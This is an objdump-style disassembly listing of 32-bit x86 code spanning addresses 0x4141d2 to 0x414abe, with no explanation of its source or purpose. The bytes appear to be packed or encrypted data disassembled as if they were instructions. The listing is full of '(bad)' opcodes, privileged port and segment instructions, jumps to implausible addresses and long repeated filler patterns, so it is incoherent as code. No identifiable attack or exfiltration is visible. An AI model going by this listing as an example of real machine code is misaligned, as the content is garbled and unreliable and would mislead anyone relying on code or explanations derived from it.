  4141d2:	sub    BYTE PTR [ecx+0x1e],al
  4141d5:	xchg   DWORD PTR [esi],edi
  4141d7:	es repz add al,0x60
  4141db:	ins    BYTE PTR es:[edi],dx
  4141dc:	or     eax,0x872170f9
  4141e1:	shl    ch,0x8d
  4141e4:	and    BYTE PTR [edi+0x3de8e417],al
  4141ea:	bound  edx,QWORD PTR [ebx+0x263c20b9]
  4141f0:	add    cl,BYTE PTR [ecx+0x6f39fbe]
  4141f6:	push   0xe900fe81
  4141fb:	pusha  
  4141fc:	push   cs
  4141fd:	mov    ch,0x9
  4141ff:	hlt    
  414200:	inc    esp
  414201:	add    BYTE PTR [eax-0x77],dh
  414204:	(bad)
  414207:	out    0xea,eax
  414209:	cld    
  41420a:	jmp    0x5e4a476f
  41420f:	add    BYTE PTR [ebp+0x3f],dl
  414212:	jmp    0x870125ae
  414217:	adc    al,BYTE PTR [ebp+0x5608de5]
  41421d:	add    dl,dh
  41421f:	xchg   ecx,eax
  414220:	and    cl,BYTE PTR [ebp+0x28]
  414223:	pop    edi
  414224:	mov    WORD PTR [ebx+0x7d],?
	...
  414233:	add    BYTE PTR [eax],al
  414235:	add    BYTE PTR [edi-0x38],ch
  414238:	sub    DWORD PTR [ecx+0x1ad18ce4],0x6ade8cc9
  414242:	add    BYTE PTR [ebx-0x77],0x1d
  414246:	xor    ah,BYTE PTR [edx]
  414248:	push   esi
  414249:	test   al,0x60
  41424b:	push   cs
  41424c:	jae    0x41424e
  41424e:	jle    0x4141d1
  414250:	faddp  st(1),st
  414252:	and    eax,0x76e77f04
  414257:	push   es
  414258:	add    BYTE PTR [eax],al
  41425a:	rcl    DWORD PTR [esi+0x1d],0x54
  41425e:	retf   
  41425f:	add    eax,0x1f4bdf87
  414264:	or     eax,DWORD PTR [ecx-0x2f5a3]
  41426a:	jp     0x41426e
  41426c:	mov    bh,0x20
  41426e:	fmul   st,st(0)
  414270:	std    
  414271:	mov    BYTE PTR [ebp+0x49],dl
  414274:	out    dx,al
  414275:	push   ss
  414276:	sti    
  414277:	es stc 
  414279:	add    BYTE PTR [edx+0x5],bh
  41427c:	or     DWORD PTR [edi+0x40b96a],esi
  414282:	jnp    0x414298
  414284:	dec    BYTE PTR [ebp+0x32]
  414287:	mov    edi,DWORD PTR [eax+edi*8+0x3a]
  41428b:	inc    BYTE PTR [ebx+ebp*4-0x7601f0dc]
  414292:	repnz inc esp
  414294:	fstp   QWORD PTR [edi]
  414296:	ret    
  414297:	cmp    edx,eax
  414299:	out    dx,al
	...
  4142a6:	add    BYTE PTR [eax],al
  4142a8:	add    bl,al
  4142aa:	inc    esp
  4142ab:	or     cl,dh
  4142ad:	xchg   ebx,eax
  4142ae:	cmp    DWORD PTR [eax],esi
  4142b0:	enter  0x4a93,0x80
  4142b4:	jecxz  0x414256
  4142b6:	pop    edi
  4142b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142b8:	stos   BYTE PTR es:[edi],al
  4142b9:	sub    esi,DWORD PTR [ebx]
  4142bb:	xor    cl,bl
  4142bd:	jae    0x4142f8
  4142bf:	shl    al,0x15
  4142c2:	jl     0x414297
  4142c4:	shl    esp,1
  4142c6:	jl     0x414287
  4142c8:	or     DWORD PTR [eax+0x7c],ebp
  4142cb:	int    0xc1
  4142cd:	xor    al,BYTE PTR [ecx]
  4142cf:	xor    eax,ecx
  4142d1:	push   ebx
  4142d2:	dec    edx
  4142d3:	and    bl,0x63
  4142d6:	push   edi
  4142d7:	add    al,0xff
  4142d9:	arpl   WORD PTR ds:0x2d9b8829,bx
  4142df:	and    al,0x7
  4142e1:	jb     0x41430f
  4142e3:	jns    0x4142b4
  4142e5:	mov    ds:0x9b310646,al
  4142ea:	gs inc ebx
  4142ec:	add    BYTE PTR [eax+0x5032d4db],0xdd
  4142f3:	sub    cl,BYTE PTR [eax+0x1242dab]
  4142f9:	push   edx
  4142fa:	sub    al,0x79
  4142fc:	(bad)  
  4142fd:	mov    ds:0x9330f416,al
  414302:	jne    0x414347
  414304:	add    BYTE PTR [eax+0x64ff08f7],0xbd
  41430b:	sub    ecx,DWORD PTR [eax+0x0]
	...
  414319:	add    BYTE PTR [eax],al
  41431b:	add    BYTE PTR [ebx],bh
  41431d:	lods   eax,DWORD PTR ds:[esi]
  41431e:	and    DWORD PTR [edi],ecx
  414320:	xchg   edx,eax
  414321:	lods   eax,DWORD PTR ds:[esi]
  414322:	jp     0x4142eb
  414324:	and    al,dh
  414326:	std    
  414327:	xor    BYTE PTR [ebx],dh
  414329:	gs inc esp
  41432b:	add    BYTE PTR [eax-0x9],0xf8
  41432f:	push   cs
  414330:	fs std 
  414332:	sub    ecx,DWORD PTR [edx-0x1dbd195a]
  414338:	pop    edi
  414339:	std    
  41433a:	cmp    al,0x88
  41433c:	jnp    0x4143a9
  41433e:	mov    esi,0xbe735f07
  414343:	pop    es
  414344:	(bad)  
  414346:	test   al,0x5d
  414348:	test   al,0x65
  41434a:	adc    eax,0x1f6215c
  41434f:	push   ebx
  414350:	lea    esi,[ebx-0x5b]
  414353:	and    ebx,DWORD PTR [edi+0x10]
  414356:	jnp    0x4143cb
  414358:	aas    
  414359:	ficomp WORD PTR [edi-0x9fb2a7c]
  41435f:	outs   dx,DWORD PTR ds:[esi]
  414360:	mov    bl,0xf
  414362:	xchg   ebp,eax
  414363:	inc    edx
  414364:	pop    ebp
  414365:	mov    eax,0x43d7b327
  41436a:	fbstp  TBYTE PTR [ebx+0x84159c4]
  414370:	mov    ch,0x6c
  414372:	pop    es
  414373:	mov    bh,0x23
  414375:	add    eax,0xffa8fc3f
  41437a:	cs clc 
  41437c:	aad    0xf6
  41437e:	mov    ebp,0xb4
	...
  41438f:	jl     0x4143d6
  414391:	and    DWORD PTR [eax],ecx
  414393:	lea    ebp,[edi+eax*2-0x4a]
  414397:	and    eax,DWORD PTR ds:0xff790fff
  41439d:	push   es
  41439e:	test   eax,0x3efc319
  4143a3:	push   ss
  4143a4:	mov    cs,WORD PTR [ebx+esi*4]
  4143a7:	adc    al,0x54
  4143a9:	bound  edi,QWORD PTR [esi-0x7bb759c]
  4143af:	out    0x58,eax
  4143b1:	fbstp  TBYTE PTR [edx+0x824ed9c]
  4143b7:	inc    ebp
  4143b8:	(bad)  
  4143b9:	aas    
  4143ba:	fs test al,0x44
  4143bd:	out    0x78,eax
  4143bf:	lahf   
  4143c0:	std    
  4143c1:	pop    ss
  4143c2:	sbb    al,0x35
  4143c4:	add    dh,BYTE PTR [edi+0x1c25bc07]
  4143ca:	lds    ebx,FWORD PTR [edx+edx*4]
  4143cd:	sub    al,0xc
  4143cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143d0:	in     eax,dx
  4143d1:	nop
  4143d2:	or     BYTE PTR ds:0x9763ffff,cl
  4143d8:	inc    esp
  4143d9:	out    0x78,eax
  4143db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143dc:	std    
  4143dd:	pop    ss
  4143de:	sbb    al,0x19
  4143e0:	add    bh,BYTE PTR [edi+0x7]
  4143e3:	xchg   ecx,eax
  4143e4:	nop
  4143e5:	add    BYTE PTR [edi+edx*2],ch
  4143e8:	dec    esi
  4143e9:	call   0xfe40af59
  4143ee:	ret    0xea57
  4143f1:	pop    ebx
  4143f2:	sub    eax,DWORD PTR [eax]
	...
  414400:	add    BYTE PTR [eax],al
  414402:	iret   
  414403:	(bad)  
  414404:	push   esp
  414405:	pusha  
  414406:	add    BYTE PTR [ebx+0x58f1f9ec],0x89
  41440d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41440e:	mov    eax,0x2bed738b
  414413:	dec    ecx
  414414:	clc    
  414415:	cdq    
  414416:	icebp  
  414417:	out    0xfa,al
  414419:	xor    ah,BYTE PTR [edi+edi*8-0x75]
  41441d:	lods   al,BYTE PTR ds:[esi]
  41441e:	jo     0x41446e
  414420:	sub    DWORD PTR [edx],0x4e8538f
  414426:	pop    eax
  414427:	(bad)  
  414428:	std    
  414429:	add    DWORD PTR [eax],0xfbe93f4a
  41442f:	dec    eax
  414430:	clc    
  414431:	cdq    
  414432:	dec    eax
  414433:	xchg   edi,eax
  414434:	cld    
  414435:	neg    BYTE PTR [ebp+0x66]
  414438:	mov    al,ds:0x8cfe279d
  41443d:	sub    al,0x6f
  41443f:	dec    esi
  414440:	call   0xfe40a8b5
  414445:	(bad)  
  414446:	sti    
  414447:	stc    
  414448:	mov    DWORD PTR [edi+edx*2],esp
  41444b:	lea    eax,[ebx-0x3b]
  41444e:	mov    bh,0x61
  414450:	lock push ecx
  414452:	inc    edi
  414453:	push   ecx
  414454:	aas    
  414455:	jmp    0x1a398e05
  41445a:	jg     0x4144cb
  41445c:	cld    
  41445d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41445e:	pop    ebp
  41445f:	data16 and BYTE PTR [esi+eiz*1],ch
  414463:	dec    BYTE PTR [esp+ebp*1+0x0]
	...
  414472:	add    BYTE PTR [eax],al
  414474:	add    BYTE PTR [edi+0x4e],ch
  414477:	call   0xfe40af84
  41447c:	add    BYTE PTR [ecx-0x53],dh
  41447f:	stc    
  414480:	mov    eax,DWORD PTR [edi+0x19]
  414483:	mov    BYTE PTR [ebp+0x6e],al
  414486:	sbb    DWORD PTR [eax+esi*8+0x62],0xca414c69
  41448e:	jl     0x4144d4
  414490:	clc    
  414491:	or     bl,BYTE PTR [edx]
  414493:	inc    esi
  414494:	cld    
  414495:	sub    eax,0xdfa06507
  41449a:	enter  0x8cfd,0x7
  41449e:	adc    cl,BYTE PTR [ebp-0x18]
  4144a1:	arpl   WORD PTR ds:0x7cc4fffe,cx
  4144a7:	inc    esp
  4144a8:	clc    
  4144a9:	cli    
  4144aa:	sbb    ebp,ebx
  4144ac:	sti    
  4144ad:	cmp    eax,0x92c68207
  4144b2:	scas   eax,DWORD PTR es:[edi]
  4144b3:	mov    WORD PTR [ebp+0x6a],es
  4144b6:	mov    dl,0xe5
  4144b8:	rcl    DWORD PTR [ecx+0x7],cl
  4144bb:	(bad)  
  4144bc:	pop    esi
  4144bd:	rol    DWORD PTR [eax-0x5c7a217],0xfd
  4144c4:	push   esp
  4144c5:	add    esp,DWORD PTR ds:0x1beec80
  4144cb:	add    BYTE PTR [eax],al
  4144cd:	cdq    
  4144ce:	stos   DWORD PTR es:[edi],eax
  4144cf:	push   esi
  4144d0:	mov    ecx,DWORD PTR [edi+0x3e758af9]
  4144d6:	je     0x41445c
  4144d8:	add    BYTE PTR [eax],0x0
	...
  4144e7:	add    BYTE PTR [ebx+eax*1],ch
  4144ea:	(bad)  
  4144eb:	push   eax
  4144ec:	adc    al,BYTE PTR [ebp+0x0]
  4144ef:	add    BYTE PTR [edx],bh
  4144f1:	lahf   
  4144f2:	std    
  4144f3:	addr16 pop edx
  4144f5:	mov    bl,0x40
  4144f7:	add    BYTE PTR [edx],ah
  4144f9:	jns    0x4144f6
  4144fb:	(bad)  
  4144fc:	mov    ebp,0x788acfd8
  414501:	loope  0x41454e
  414503:	inc    ecx
  414504:	arpl   si,bp
  414506:	jns    0x41450b
  414508:	xor    DWORD PTR [eax],esi
  41450a:	jg     0x414505
  41450c:	imul   eax,DWORD PTR [edx],0x11
  41450f:	(bad)  
  414510:	out    0x6,al
  414512:	push   es
  414513:	(bad)  
  414514:	in     al,0xed
  414516:	add    DWORD PTR [eax],eax
  414518:	arpl   WORD PTR [edi+0x75d388b0],ax
  41451e:	jge    0x414593
  414520:	int    0x5b
  414522:	add    esi,DWORD PTR [eax]
  414524:	mov    cl,0x47
  414526:	aam    0x8a
  414528:	out    0xd2,al
  41452a:	add    edi,esi
  41452c:	mov    ah,0x75
  41452e:	jge    0x4145ab
  414530:	lods   eax,DWORD PTR ds:[esi]
  414531:	cmp    eax,DWORD PTR [ebx]
  414533:	(bad)  
  414534:	fidivr WORD PTR [edx+0x679cfe03]
  41453a:	jne    0x4145b7
  41453c:	xchg   ebp,eax
  41453d:	and    eax,DWORD PTR [ebx]
  41453f:	push   cs
  414540:	int    0xef
  414542:	sbb    bh,0x4
  414545:	addr16 inc ebp
  414547:	jnp    0x4145c6
  414549:	or     eax,DWORD PTR [ebx]
  41454b:	push   cs
	...
  414558:	add    BYTE PTR [eax],al
  41455a:	add    BYTE PTR [ebp-0x24082d3d],ch
  414560:	in     eax,dx
  414561:	cmp    eax,DWORD PTR [edx]
  414563:	arpl   WORD PTR [edi-0x19a67d41],bp
  414569:	xchg   BYTE PTR [ebx+eiz*8],al
  41456c:	es add al,0x75
  41456f:	and    eax,0xb8e7ae34
  414574:	aam    0x4
  414576:	(bad)  
  414577:	loopne 0x4144f9
  414579:	mov    ebp,edi
  41457b:	xor    al,0xc3
  41457d:	add    DWORD PTR [eax-0x59711198],eax
  414583:	loopne 0x4145f5
  414585:	mov    ebp,edi
  414587:	sbb    al,0xab
  414589:	add    DWORD PTR [ebp-0xb],esi
  41458c:	add    al,0x74
  41458e:	jle    0x41451c
  414590:	sti    
  414591:	sahf   
  414592:	add    al,0x94
  414594:	in     eax,dx
  414595:	push   cs
  414596:	add    esp,DWORD PTR [ebx+0x5]
  414599:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41459b:	cdq    
  41459c:	mov    ss,WORD PTR [ebx-0x18f2dd5a]
  4145a2:	scas   al,BYTE PTR es:[edi]
  4145a3:	fndisi(8087 only) 
  4145a5:	push   0xe705e817
  4145aa:	add    esi,DWORD PTR [eax]
  4145ac:	push   ebx
  4145ad:	mov    esi,0x720d2f78
  4145b2:	mov    ds,WORD PTR [eax-0x76]
  4145b5:	ins    BYTE PTR es:[edi],dx
  4145b6:	cmp    DWORD PTR [esi-0x434cb105],0xfffffffb
  4145bd:	out    0x3,eax
	...
  4145cb:	add    BYTE PTR [eax],al
  4145cd:	add    BYTE PTR [ebx+0x6f],ah
  4145d0:	out    0x9b,eax
  4145d2:	inc    esp
  4145d3:	dec    ebx
  4145d4:	test   al,0x3
  4145d6:	mov    edx,edi
  4145d8:	sub    al,0x4
  4145da:	xchg   ebp,eax
  4145db:	xor    eax,0x24e27939
  4145e0:	lods   eax,DWORD PTR ds:[esi]
  4145e1:	ret    0x8384
  4145e4:	jmp    0x4145b7
  4145e6:	and    cl,BYTE PTR [eax-0xa070cef]
  4145ec:	cs jle 0x4145e3
  4145ef:	cli    
  4145f0:	inc    BYTE PTR [ebx]
  4145f2:	arpl   WORD PTR ds:0x524803e7,ax
  4145f8:	pusha  
  4145f9:	adc    ebp,ebx
  4145fb:	sbb    BYTE PTR [ebx+0x2],0x4d
  4145ff:	sti    
  414600:	sbb    dh,dl
  414602:	cmp    dh,BYTE PTR [esi]
  414604:	bound  ecx,QWORD PTR [ecx+0x3cefbb7]
  41460a:	jmp    0x41458c
  41460c:	inc    ebx
  41460d:	add    ch,BYTE PTR ds:0xaf89befb
  414613:	sti    
  414614:	add    BYTE PTR [esi+0x2d8b8f60],dh
  41461a:	popa   
  41461b:	sti    
  41461c:	std    
  41461d:	mul    BYTE PTR [edx]
  41461f:	add    eax,0x8ce08981
  414624:	mov    ebx,0xfdfb6115
  414629:	fidivr WORD PTR [edx-0x207ed0c8]
  41462f:	cli    
  414630:	ret    
  414631:	jmp    0x0:0x0
	...
  414640:	add    BYTE PTR [eax+0x44],ah
  414643:	inc    edx
  414644:	push   0xffffffdd
  414646:	adc    eax,0x3ce0e47b
  41464b:	add    ah,bl
  41464d:	call   0xfdf9:0x61515653
  414654:	push   esi
  414655:	in     al,0xa6
  414657:	js     0x4146a8
  414659:	pusha  
  41465a:	sti    
  41465b:	add    BYTE PTR [ecx+0x6c],ch
  41465e:	add    eax,0xbedc8673
  414663:	js     0x41469c
  414665:	pusha  
  414666:	sti    
  414667:	add    BYTE PTR [edx+eax*8+0x6169838e],dh
  41466e:	sti    
  41466f:	std    
  414670:	mov    ecx,0xe900a278
  414675:	pusha  
  414676:	pop    eax
  414677:	pop    esi
  414678:	mov    dl,0xe7
  41467a:	jmp    0x5a071da
  41467f:	push   ecx
  414680:	xchg   edi,eax
  414681:	or     DWORD PTR [esp+eax*2-0x769c8f33],ecx
  414688:	lea    edi,[ecx+edx*1+0x66]
  41468c:	ins    BYTE PTR es:[edi],dx
  41468d:	sub    eax,0x1a700976
  414692:	mov    ?,WORD PTR [eax-0x7]
  414695:	retf   0xffbf
  414698:	call   0xcc53e2
  41469d:	push   0x11
  41469f:	test   edi,eax
  4146a1:	pushf  
  4146a2:	xor    dl,dl
  4146a4:	sldt   WORD PTR [eax]
	...
  4146b3:	add    BYTE PTR [ebp-0x357cad30],bl
  4146b9:	or     eax,0xff7ee850
  4146be:	sti    
  4146bf:	push   DWORD PTR [edx+0x21]
  4146c2:	dec    ecx
  4146c3:	inc    ecx
  4146c4:	or     ch,dh
  4146c6:	cmp    bh,cl
  4146c8:	in     eax,0x6
  4146ca:	push   cs
  4146cb:	mov    bh,0xc1
  4146cd:	push   edx
  4146ce:	push   ebx
  4146cf:	call   0x3d45be
  4146d4:	bound  esp,QWORD PTR [ecx-0x1235beb7]
  4146da:	es stc 
  4146dc:	inc    ebp
  4146dd:	pop    es
  4146de:	push   cs
  4146df:	mov    bh,0x21
  4146e1:	push   ebx
  4146e2:	push   esi
  4146e3:	call   0x3d45de
  4146e8:	add    eax,0xb2c25764
  4146ed:	add    eax,0x21c68b4f
  4146f2:	or     BYTE PTR [ebx+0x22],dl
  4146f5:	or     esi,ebp
  4146f7:	inc    DWORD PTR [ebp-0x7f]
  4146fa:	mov    edi,0x57a80
  4146ff:	mov    eax,0x3d549a
  414704:	add    DWORD PTR [esi],edx
  414706:	test   DWORD PTR [ebx],edx
  414708:	or     esi,eax
  41470a:	add    al,0x83
  41470c:	cmp    DWORD PTR [edx],eax
  41470e:	cmp    DWORD PTR [eax+0x720040b7],esp
  414714:	gs mov esp,0x4da0
	...
  414726:	add    BYTE PTR [ebx],cl
  414728:	add    eax,0x12d31087
  41472d:	jg     0x4146ef
  41472f:	cmp    BYTE PTR ds:[edi+0x24116304],0x4e
  414737:	mov    ds:0x88ed73ee,al
  41473c:	lods   al,BYTE PTR ds:[esi]
  41473d:	or     BYTE PTR [eax],al
  41473f:	nop
  414740:	jae    0x4147a2
  414742:	and    al,0x6b
  414744:	sbb    ebp,esp
  414746:	call   0x8040ef66
  41474b:	and    BYTE PTR [edi+0x4],ch
  41474e:	add    BYTE PTR [ebx+0x66],ah
  414751:	and    al,0x4b
  414753:	mov    ds:0xea118cee,al
  414758:	inc    BYTE PTR [ecx+eax*8+0x4c46b67]
  41475f:	es dec esi
  414761:	dec    ebp
  414762:	aas    
  414763:	arpl   sp,di
  414765:	lock mov eax,0x411a03
  41476b:	fdivr  st,st(3)
  41476d:	mov    dl,BYTE PTR [eax]
  41476f:	loopne 0x41479c
  414771:	or     BYTE PTR [ecx+0x203eeaa3],al
  414777:	and    eax,0xbc7201ad
  41477c:	mov    ds:0x916304c3,eax
  414781:	mov    ah,bl
  414783:	loopne 0x4147c7
  414785:	sbb    al,0x51
  414787:	sub    eax,0x85d63
	...
  414798:	add    BYTE PTR [eax],al
  41479a:	fcomp  DWORD PTR [ecx+0x261e8b0d]
  4147a0:	push   esp
  4147a1:	push   ecx
  4147a2:	mov    eax,DWORD PTR [ecx]
  4147a4:	cld    
  4147a5:	std    
  4147a6:	je     0x414801
  4147a8:	inc    ebp
  4147a9:	lock adc esi,DWORD PTR [ecx+0x43]
  4147ad:	or     BYTE PTR [ebx],dl
  4147af:	push   ss
  4147b0:	in     al,0xf8
  4147b2:	pop    esp
  4147b3:	out    dx,eax
  4147b4:	mov    es,WORD PTR [ebx+0x4b]
  4147b7:	sahf   
  4147b8:	test   cl,al
  4147ba:	jae    0x4147c1
  4147bc:	cmp    ch,ah
  4147be:	xor    bh,ch
  4147c0:	fiadd  WORD PTR [eax]
  4147c2:	retf   0x23a5
  4147c5:	inc    ebx
  4147c6:	arpl   WORD PTR [edx-0x126c03dc],cx
  4147cc:	inc    esp
  4147cd:	sti    
  4147ce:	es clc 
  4147d0:	dec    edi
  4147d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147d2:	scas   eax,DWORD PTR es:[edi]
  4147d3:	inc    esi
  4147d4:	out    0x8e,eax
  4147d6:	mov    al,ds:0x7eec17f5
  4147db:	(bad)  
  4147dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147dd:	add    BYTE PTR [edx-0x5b],bh
  4147e0:	sub    eax,DWORD PTR [ebx+0x63]
  4147e3:	mov    ch,BYTE PTR [esp+ebp*8]
  4147e6:	xchg   ebx,eax
  4147e7:	in     eax,dx
  4147e8:	or     bl,bh
  4147ea:	out    dx,al
  4147eb:	div    DWORD PTR [edx+0x5e]
  4147ee:	out    0x8b,eax
  4147f0:	and    al,0xf4
  4147f2:	in     al,0x41
  4147f4:	jae    0x414780
  4147f6:	cmp    ch,dh
  4147f8:	bound  ebx,QWORD PTR [esi-0x29]
  4147fb:	mov    ebp,DWORD PTR [ebx+ebp*8+0x0]
	...
  41480a:	add    BYTE PTR [eax],al
  41480c:	add    ah,bl
  41480e:	inc    ecx
  41480f:	push   ebx
  414810:	mov    bl,BYTE PTR [eax]
  414812:	in     eax,dx
  414813:	mov    edi,0xe7462823
  414818:	mov    fs,WORD PTR [eax]
  41481a:	std    
  41481b:	xchg   edi,eax
  41481c:	jmp    0x414888
  41481e:	(bad)  
  41481f:	add    BYTE PTR ds:[edx],cl
  414822:	and    eax,0x8a6342a4
  414827:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414828:	repz xor ebp,ebp
  41482b:	aam    0xfa
  41482d:	xchg   bh,dh
  41482f:	(bad)  
  414830:	and    ebp,DWORD PTR [eax]
  414832:	inc    esi
  414833:	out    0x8e,eax
  414835:	and    ch,ch
  414837:	mov    bh,0xeb
  414839:	dec    esi
  41483a:	inc    BYTE PTR [esi]
  41483c:	add    cl,bl
  41483e:	pop    ecx
  41483f:	sti    
  414840:	mov    esp,DWORD PTR [eax-0x629fff0b]
  414846:	stc    
  414847:	xchg   DWORD PTR [eax+edx*2-0x2722a473],ecx
  41484e:	inc    edx
  41484f:	call   0x8832f2c4
  414854:	xor    al,0x47
  414856:	outs   dx,BYTE PTR ds:[esi]
  414857:	mov    al,ds:0x8b05a61c
  41485c:	sub    al,0x27
  41485e:	push   esi
  41485f:	call   0xfe3a6824
  414864:	inc    ecx
  414865:	mov    edi,0xf3e93f4a
  41486a:	inc    edx
  41486b:	lock cmp edi,esi
  41486e:	in     al,dx
  41486f:	clc    
  414870:	sahf   
	...
  41487d:	add    BYTE PTR [eax],al
  41487f:	add    ah,bh
  414881:	ins    DWORD PTR es:[edi],dx
  414882:	mov    al,ds:0x8b059e24
  414887:	and    al,0xff
  414889:	push   ebp
  41488a:	call   0xfe3a3033
  41488f:	pop    ss
  414890:	repnz inc edx
  414892:	clc    
  414893:	sbb    edi,eax
  414895:	cmp    eax,0x468acc6e
  41489b:	icebp  
  41489c:	xor    BYTE PTR [edx-0x12e8a6bd],cl
  4148a2:	jne    0x4148f5
  4148a4:	mov    ah,0xf8
  4148a6:	and    DWORD PTR [edi],0xac8b4f57
  4148ac:	mov    eax,0x98d3e855
  4148b1:	clc    
  4148b2:	std    
  4148b3:	xchg   edi,eax
  4148b4:	cmp    DWORD PTR [esi-0x14],edi
  4148b7:	mov    WORD PTR [edx-0x2843fff3],fs
  4148bd:	loop   0x41493e
  4148bf:	or     eax,0xe9fdf6d3
  4148c4:	adc    DWORD PTR [edi+0x55],ecx
  4148c7:	bound  eax,QWORD PTR [edx]
  4148c9:	or     eax,0x5e70089
  4148ce:	mov    DWORD PTR [ebp-0x40836],eax
  4148d4:	cli    
  4148d5:	jmp    0xf77f472e
  4148da:	push   0x0
  4148dc:	mov    dl,0x21
  4148de:	dec    esi
  4148df:	inc    ecx
  4148e0:	dec    edx
  4148e1:	jmp    0x0:0xfde5
	...
  4148f0:	add    BYTE PTR [eax],al
  4148f2:	add    BYTE PTR ds:0xc0d22df7,cl
  4148f8:	test   BYTE PTR [eax],ah
  4148fa:	dec    esi
  4148fb:	jnp    0x4148fe
  4148fd:	mov    BYTE PTR [eax+ebx*1],al
  414900:	inc    esp
  414901:	jg     0x4148fd
  414903:	xor    dh,BYTE PTR [esi-0x13]
  414906:	mov    DWORD PTR [edi-0x42000186],0xa000000
  414910:	jmp    0x414966
  414912:	mov    edx,ebx
  414914:	mov    BYTE PTR [ecx-0x409238c],al
  41491a:	xor    eax,ecx
  41491c:	jmp    0xfffe:0x6e478b30
  414923:	dec    ebp
  414924:	mov    DWORD PTR [ecx-0x408c384],eax
  41492a:	push   DWORD PTR [edi]
  41492c:	outs   dx,BYTE PTR ds:[esi]
  41492d:	(bad)  
  41492e:	call   FWORD PTR ds:0xc7c898b
  414934:	idiv   ebx
  414936:	paddusb mm0,QWORD PTR [edx]
  414939:	jg     0x41491b
  41493b:	popf   
  41493c:	mov    bh,BYTE PTR [ecx-0x408a384]
  414942:	unpcklps xmm6,XMMWORD PTR [edi]
  414945:	sub    eax,0xc60102f8
  41494a:	add    edi,DWORD PTR [edx+0x42]
  41494d:	inc    edx
  41494e:	add    DWORD PTR [eax+0x1a],0x79
  414952:	add    eax,0x3a6c63
	...
  414963:	add    BYTE PTR [eax],al
  414965:	add    dh,dh
  414967:	sbb    eax,0x8b7b5653
  41496c:	sti    
  41496d:	std    
  41496e:	pop    esp
  41496f:	pusha  
  414970:	test   al,0x78
  414972:	push   ebp
  414973:	cld    
  414974:	sti    
  414975:	add    bl,ah
  414977:	mov    bh,0x1
  414979:	jae    0x414977
  41497b:	pop    edi
  41497c:	mov    ebp,0xfbd43d78
  414981:	add    BYTE PTR [esi-0x1c7c7284],ch
  414987:	(bad)  
  414988:	sti    
  414989:	std    
  41498a:	xchg   ebx,eax
  41498b:	(bad)  
  41498c:	(bad)  
  41498d:	sti    
  41498e:	sbb    al,0xb4
  414990:	pop    ebx
  414991:	pop    esi
  414992:	mov    eax,0x215bf065
  414997:	out    0x1,eax
  414999:	push   ebx
  41499a:	fiadd  DWORD PTR [ecx+0x3c905054]
  4149a0:	xchg   DWORD PTR [ebx+0x6b],edx
  4149a3:	addr16 pop ebp
  4149a5:	or     al,0xd8
  4149a7:	sbb    DWORD PTR [edi+ebp*1],edx
  4149aa:	sbb    bh,BYTE PTR [ecx+0x8]
  4149ad:	por    mm5,QWORD PTR [edx]
  4149b0:	or     eax,0x12e2e9f8
  4149b5:	mov    BYTE PTR [edi-0x2b],ah
  4149b8:	inc    edx
  4149b9:	or     edx,0x10eb7df6
  4149bf:	mov    al,0xe9
  4149c1:	lods   al,BYTE PTR ds:[esi]
  4149c2:	mov    ecx,0x912ffb5b
  4149c7:	push   ecx
  4149c8:	adc    BYTE PTR [edx],bl
	...
  4149d6:	add    BYTE PTR [eax],al
  4149d8:	add    cl,bl
  4149da:	loop   0x414a0b
  4149dc:	xor    ah,BYTE PTR [edx+0x76]
  4149df:	add    DWORD PTR [edx-0x20],eax
  4149e2:	cmp    BYTE PTR [esp+edi*2],cl
  4149e5:	xchg   ebx,eax
  4149e6:	in     eax,dx
  4149e7:	iret   
  4149e8:	mov    bl,BYTE PTR [edi]
  4149ea:	add    eax,0x9ebfbfc
  4149ef:	fld    DWORD PTR [ecx-0x1e]
  4149f2:	out    dx,eax
  4149f3:	fistp  QWORD PTR [edi+0x72]
  4149f6:	push   ebx
  4149f7:	mov    dl,0x8a
  4149f9:	ja     0x414a4d
  4149fb:	sub    DWORD PTR [eax],edx
  4149fd:	arpl   WORD PTR ds:0x56303e7,ax
  414a03:	out    0x3,eax
  414a05:	arpl   WORD PTR ds:0x56303e7,ax
  414a0b:	out    0x3,eax
  414a0d:	arpl   WORD PTR ds:0x56303e7,ax
  414a13:	out    0x3,eax
  414a15:	arpl   WORD PTR ds:0x56303e7,ax
  414a1b:	out    0x3,eax
  414a1d:	arpl   WORD PTR ds:0x56303e7,ax
  414a23:	out    0x3,eax
  414a25:	arpl   WORD PTR ds:0x56303e7,ax
  414a2b:	out    0x3,eax
  414a2d:	arpl   WORD PTR ds:0x56303e7,ax
  414a33:	out    0x3,eax
  414a35:	arpl   WORD PTR ds:0x56303e7,ax
  414a3b:	out    0x3,eax
	...
  414a49:	add    BYTE PTR [eax],al
  414a4b:	add    BYTE PTR [ebx+0x5],ah
  414a4e:	out    0x3,eax
  414a50:	arpl   WORD PTR ds:0x56303e7,ax
  414a56:	out    0x3,eax
  414a58:	arpl   WORD PTR ds:0x56303e7,ax
  414a5e:	out    0x3,eax
  414a60:	arpl   WORD PTR ds:0x56303e7,ax
  414a66:	out    0x3,eax
  414a68:	arpl   WORD PTR ds:0x56303e7,ax
  414a6e:	out    0x3,eax
  414a70:	arpl   WORD PTR ds:0x560e900,ax
  414a76:	add    cl,ch
  414a78:	pusha  
  414a79:	add    eax,0x560e900
  414a7e:	add    cl,ch
  414a80:	pusha  
  414a81:	add    eax,0x5ae400
  414a86:	or     cl,BYTE PTR [eax-0x7498bef0]
  414a8c:	cmp    BYTE PTR [ebx+0x2f],0xcf
  414a90:	nop
  414a91:	and    ah,BYTE PTR [eax]
  414a93:	leave  
  414a94:	jge    0x414abb
  414a96:	and    BYTE PTR [ebp-0x48],dh
  414a99:	data16 and BYTE PTR [edx-0x36],bl
  414a9d:	push   edx
  414a9e:	ins    BYTE PTR es:[edi],dx
  414a9f:	dec    ebp
  414aa0:	ret    0x2077
  414aa3:	pop    ebp
  414aa4:	mov    edi,0xc24b2066
  414aa9:	jns    0x414b1f
  414aab:	dec    esp
  414aac:	xchg   ebp,eax
  414aad:	and    eax,0x103a
	...
  414abe:	add    BYTE PTR [edx-0x1],ch
